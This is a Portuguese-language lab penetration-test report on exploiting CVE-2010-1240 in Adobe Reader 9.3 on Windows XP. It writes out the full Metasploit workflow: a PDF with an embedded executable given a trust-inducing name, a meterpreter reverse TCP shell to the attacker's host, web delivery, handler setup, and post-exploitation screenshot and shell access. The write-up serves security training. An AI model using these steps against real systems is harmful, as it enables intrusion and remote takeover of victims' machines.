<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATORIO TECNICO: ANALISE DE VULNERABILIDADE (CVE-2010-1240)</h1>

<p><strong>DOCUMENTO DE NIVEL CONFIDENCIAL</strong><br>
<strong>Data da Operacao:</strong> 19 de Novembro de 2025<br>
<strong>Responsaveis Tecnicos:</strong> Yuri Alexander e Gabriel Machado<br>
<strong>Objeto de Analise:</strong> Exploracao de Falha em Client-Side (Adobe Reader 9.3)</p>

<hr>

<h3>EVIDENCIA EM VIDEO</h3>
<p>Registro visual da operacao realizada em ambiente de laboratorio:</p>

<div style="background-color:#000; text-align:center; padding:10px;">
    <video width="100%" height="auto" controls>
        <source src="video.mp4" type="video/mp4">
        Seu navegador nao suporta a tag de video.
    </video>
</div>
<p><i>Nome do arquivo: video.mp4</i></p>

<hr>

<h3>1. RESUMO DO CENARIO</h3>
<p>A operacao consistiu em um teste de intrusao focado em Engenharia Social e exploracao de vulnerabilidade de software desatualizado. O objetivo foi obter acesso remoto a uma estacao de trabalho Windows XP atraves de um arquivo PDF malicioso.</p>

<ul>
    <li><strong>Maquina Atacante (Kali Linux):</strong> IP 192.168.20.2 (Interface eth0)</li>
    <li><strong>Maquina Alvo (Windows XP):</strong> Sub-rede 192.168.20.x, executando Adobe Reader 9.3</li>
    <li><strong>Vetor de Ataque:</strong> Metasploit Framework / Apache Web Server</li>
</ul>

<hr>

<h3>2. EXECUCAO TECNICA DETALHADA</h3>

<h4>Fase 1: Configuracao do Exploit (Adobe PDF Embedded EXE)</h4>
<p>Os analistas selecionaram o modulo responsavel por embutir um executavel malicioso dentro de uma estrutura de arquivo PDF. Esta tecnica depende da interacao do usuario para ser efetiva.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
</pre>

<h4>Fase 2: Definicao do Payload e Parametros de Rede</h4>
<p>Nesta etapa, foi configurado o codigo que estabelece a conexao reversa (o alvo conecta no atacante). O nome do arquivo foi definido como "ArquivoConfiavel.pdf" para aumentar a probabilidade de execucao pela vitima.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(...) > set LHOST 192.168.20.2
msf exploit(...) > set LPORT 4444
msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf</code>
</pre>

<blockquote style="background-color:#eee; padding:10px; border-left: 5px solid #555;">
<strong>NOTA DE TROUBLESHOOTING (ANALISE DE FALHA):</strong><br>
Durante a execucao inicial, a conexao reversa falhou. A equipe identificou, atraves da interface grafica de rede do Kali Linux ("Wired connection 1"), que o endereco IP local nao correspondia ao configurado no exploit.
<br><br>
<strong>Acao Corretiva:</strong> O comando <code>set LHOST 192.168.20.2</code> foi reexecutado e o exploit foi gerado novamente para garantir a integridade da conexao.
</blockquote>

<p><strong>Geracao do Artefato Final:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > exploit
# [+] Arquivo gerado com sucesso em: /root/.msf4/local/ArquivoConfiavel.pdf</code>
</pre>

<h4>Fase 3: Distribuição (Delivery)</h4>
<p>Para simular um cenario real de download, o arquivo foi movido para o diretorio publico do servidor web Apache.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code># Copia do arquivo para o servidor web
cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
</pre>

<h4>Fase 4: Configuracao do Handler (Escuta)</h4>
<p>O console do Metasploit foi configurado para aguardar conexoes na porta 4444.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.2
msf exploit(handler) > exploit</code>
</pre>

<hr>

<h3>3. COMPROMETIMENTO DO ALVO</h3>

<p>A sequencia de acoes na maquina da vitima resultou na execucao do codigo arbitrario:</p>
<ol>
    <li>O usuario acessou o endereco <code>http://192.168.20.2</code> via Internet Explorer.</li>
    <li>O download do arquivo <strong>ArquivoConfiavel.pdf</strong> foi realizado para o Desktop.</li>
    <li>Ao abrir o arquivo, o Adobe Reader exibiu o alerta de seguranca: <em>"The file and its viewer application are set to be launched by this PDF file"</em>.</li>
    <li>O usuario ignorou o aviso e clicou no botao <strong>Open</strong>.</li>
</ol>
<p><em>Comportamento observado: Uma janela de prompt de comando (CMD) apareceu brevemente e fechou, indicando a injecao do processo na memoria.</em></p>

<hr>

<h3>4. POS-EXPLORACAO E EVIDENCIAS</h3>

<p>Imediatamente apos a acao do usuario, a sessao foi estabelecida no console do atacante.</p>

<pre style="background-color:#333; color:#fff; padding:10px;">
<code>[*] Sending stage (179771 bytes) to 192.168.20.x
[*] Meterpreter session 1 opened (192.168.20.2:4444 -> 192.168.20.x:1045)</code>
</pre>

<p>Para confirmar o nivel de acesso, foram executados os seguintes comandos:</p>

<p><strong>1. Captura de Tela (Reconhecimento Visual)</strong></p>
<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
<code>meterpreter > screenshot
# Screenshot saved to /root/screenshot.jpeg</code>
</pre>

<p><strong>2. Acesso ao Shell do Sistema (Controle Total)</strong></p>
<pre style="background-color:#f4f4f4; padding:5px; border:1px solid #ddd;">
<code>meterpreter > shell
C:\Documents and Settings\Administrator\Desktop></code>
</pre>

<hr>

<h3>5. CONCLUSAO</h3>
<p>O teste foi concluido com exito, demonstrando vulnerabilidade critica no ambiente analisado. A combinacao de software desatualizado com a falta de conscientizacao do usuario permitiu o comprometimento total da confidencialidade e integridade do sistema alvo.</p>
